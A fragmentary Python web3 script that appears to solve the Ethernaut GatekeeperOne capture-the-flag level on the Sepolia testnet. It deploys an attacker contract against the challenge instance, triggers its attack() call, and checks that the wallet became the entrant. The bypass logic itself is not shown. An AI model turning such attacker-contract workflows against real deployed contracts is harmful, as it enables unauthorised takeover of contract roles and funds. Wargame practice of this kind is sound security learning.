...
compiled_gate1_contract = compile_contract('./GatekeeperOne.sol', '0.8.0')
gate1_contract = w3.eth.contract(address=_ethernaut_deployed_address, abi=compiled_gate1_contract['abi'])
# Just to confirm it is not already solved
# assert gate1_contract.functions.entrant().call() != _WALLET

# Create attack contract object
compiled_attack_contract = compile_contract('./GatekeeperOneAttacker1.sol', '0.8.0')
...
transaction = attack_contract.constructor(gate1_contract.address).build_transaction({
    'from': _WALLET,
...
# Call attacker's function attack()
transaction = attack_contract.functions.attack().build_transaction({
    'from': _WALLET,
    'chainId': 11155111,  # sepolia testnet chain id
    'gasPrice': w3.eth.gas_price,
    'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
...
# Check if you have solved it
assert gate1_contract.functions.entrant().call() == _WALLET
print('Well done, You have completed this level!!! Submit instance.')
